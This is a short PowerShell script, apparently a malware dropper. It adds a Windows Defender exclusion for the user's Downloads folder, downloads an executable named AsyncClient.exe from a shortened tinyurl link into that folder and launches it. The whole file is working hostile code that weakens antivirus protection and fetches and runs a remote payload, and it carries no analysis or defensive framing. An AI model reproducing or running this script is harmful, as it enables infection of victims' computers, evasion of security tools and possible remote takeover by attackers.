Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
$url = 'https://tinyurl.com/3yhak4wk'
$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'AsyncClient.exe')

# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
Start-Sleep -Milliseconds 100 

# Create a WebClient object to download the file
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $outputFile)

# Run the downloaded file after the download is complete
Start-Process -FilePath $outputFile